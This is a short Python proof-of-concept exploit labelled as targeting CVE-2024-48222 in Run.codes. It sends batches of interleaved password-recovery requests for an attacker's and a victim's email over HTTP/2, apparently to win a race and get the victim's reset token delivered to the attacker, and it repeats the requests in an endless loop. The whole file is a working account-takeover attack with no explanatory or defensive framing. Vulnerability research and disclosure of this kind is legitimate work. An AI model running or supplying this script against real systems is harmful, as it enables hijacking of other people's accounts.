import httpx
import asyncio

import argparse

async def recover_password(base_url, email):
    print("Sending recovery request...")
    url = f'{base_url}/users/recoveryPassword'
    payload = {
        '_method': 'POST',
        'data[User][email]': email
    }
    async with httpx.AsyncClient(http2=True) as client:
        response = await client.post(url, data=payload)
        return response

async def send_recovery_requests_async(base_url, emails):
    tasks = [recover_password(base_url, email) for email in emails]
    return await asyncio.gather(*tasks)

async def main():
    parser = argparse.ArgumentParser(description="Run.codes CVE-2024-48222")

    parser.add_argument('-u', '--url', required=True, help="Base URL", dest='base_url')
    parser.add_argument('-a', '--attacker-email', required=True, help="Attacker's email", dest='attacker_email')
    parser.add_argument('-e', '--victim-email', required=True, help="Victim's email", dest='victim_email')
    parser.add_argument('-t', '--tries-in-packet', default=10, help="How many recovery tries to put in a single http/2 packet", dest='tries')

    args = parser.parse_args()

    base_url = args.base_url
    attacker_email = args.attacker_email
    victim_email = args.victim_email
    tries = args.tries
    emails = [ attacker_email, victim_email ]

    while True:
        await send_recovery_requests_async(base_url, [emails[i%2] for i in range(tries)])

if __name__ == "__main__":
    asyncio.run(main())

